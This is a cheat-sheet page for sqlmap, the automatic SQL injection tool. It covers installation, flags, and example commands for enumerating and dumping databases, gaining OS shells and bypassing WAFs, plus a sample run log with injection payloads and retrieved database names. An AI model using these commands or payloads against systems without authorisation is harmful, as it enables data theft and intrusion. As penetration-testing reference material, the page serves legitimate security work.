---
title : "SQLmap"
# pre : ' '
description : "Automatic SQL injection and database takeover tool."
date : 2020-03-11T10:24:41+01:00
# hidden : true
# draft : true
weight : 1740
tags : ['Other', 'macOS', 'Windows', 'Linux']
---

---

Automatic SQL injection and database takeover tool.

## Installation

```plain
git clone https://github.com/sqlmapproject/sqlmap.git
```

## Usage

```plain
python3 sqlmap.py [options]
```

## Flags

```plain
Usage: python3 sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users
```

## Examples

Scan site for SQLi

```plain
sqlmap -u <url>
```

Scan through proxy

```plain
sqlmap --proxy http://127.0.0.1:8080 --url <url>
```

Scan database name

```plain
sqlmap -u <url> --dbs
```

Scan tables in database

```plain
sqlmap -u <url> -D <database> --tables
```

Scan columns in table

```plain
sqlmap -u <url> -D <database> -T <table> --columns
```

Dump content of columns

```plain
sqlmap -u <url> -D <database> -T <table> -C <columns> --dump
```

Use a GET/POST request as input for SQLmap, safe a GET/POST request to a text file

```plain
sqlmap -r <input-file-containing-post> -p <injectable-field>
```

```plain
python3 sqlmap.py --url <target> --dbs

[*] starting @ 10:44:45 /2020-03-11/

[10:44:45] [INFO] resuming back-end DBMS 'mysql'
[10:44:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3606=3606

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4579 FROM (SELECT(SLEEP(5)))ocUh)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-2851 UNION ALL SELECT NULL,CONCAT(0x7178706a71,0x744446644b475042646478536e4178614975774c555045674270727972535278734671475347744f,0x71766a7071),NULL,NULL-- -
---
[10:44:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (Percona fork)
[10:44:45] [INFO] fetching database names
[10:44:46] [INFO] retrieved: 'information_schema'
[10:44:47] [INFO] retrieved: 'db83231_p'
[10:44:47] [INFO] retrieved: 'db83231_a'
available databases [3]:
[*] db83231_p
[*] db83231_a
[*] information_schema

[10:44:47] [INFO] fetched data logged to text files under '<dir>'

[*] ending @ 10:44:47 /2020-03-11/
```

### To run all without questions

```plain
--level 4 --risk 3 --batch
```

### Bypass WAF option

```plain
--tamper="between,randomcase"
```

## URL List

- [Sqlmap.org](http://sqlmap.org/)
- [GitHub.com - SQLmap](https://github.com/sqlmapproject/sqlmap)
- [Pollevanhoof.be SQLi guide](https://pollevanhoof.be/nuggets/SQL_injection/blind_injection)
